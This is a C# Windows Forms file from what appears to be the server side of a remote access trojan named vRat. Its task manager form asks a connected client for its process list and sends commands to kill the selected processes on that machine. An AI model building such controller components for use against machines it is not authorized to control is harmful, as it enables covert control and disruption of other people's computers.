using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using vRatServer.Classes;

namespace vRatServer.Forms
{
    public partial class TaskManager : Form
    {
        Client cli; byte[] r = null;
        public void AddEntry(byte[] data)
        {
            //listView1.Items.Add();
            string text = System.Text.Encoding.Unicode.GetString(data);


            StringReader reader = new StringReader(text);
            ListViewItem k = new ListViewItem();
            int i = 0;
            while (true)
            {
                string line = reader.ReadLine();

                if (line == null)
                {
                    break;
                }
                line = line.TrimEnd('\r', '\n');
                if (i == 0)
                {
                    k.Text = line;
                }
                else { k.SubItems.Add(line); }

                i++;

            }
            listView1.Items.Add(k);


        }
        public TaskManager(Client cli)
        {
            this.cli = cli;
            InitializeComponent();
        }

        private void TaskManager_Load(object sender, EventArgs e)
        {
            cli.tkm = this;
            
            globals.SendPacket(cli, (byte)globals.PacketType.tasklist, 0, 0, ref r);
        }

        private void killToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //kill pid
            int pid;
            var t = listView1.SelectedItems;
            if (t.Count == 0) { return; }
            foreach (ListViewItem i in t)
            {
                //MessageBox.Show(i.SubItems[1].Text);
                pid = int.Parse(i.SubItems[1].Text);
                byte[] rp = BitConverter.GetBytes(pid);
                globals.SendPacket(cli, (byte)globals.PacketType.taskkill, 4, 0, ref rp);
            }
            listView1.Items.Clear();

            ThreadPool.QueueUserWorkItem((state) => { Thread.Sleep(1000); globals.SendPacket(cli, (byte)globals.PacketType.tasklist, 0, 0, ref r); });


        }

        private void TaskManager_FormClosed(object sender, FormClosedEventArgs e)
        {
            this.cli.tkm = null;
        }
    }
}
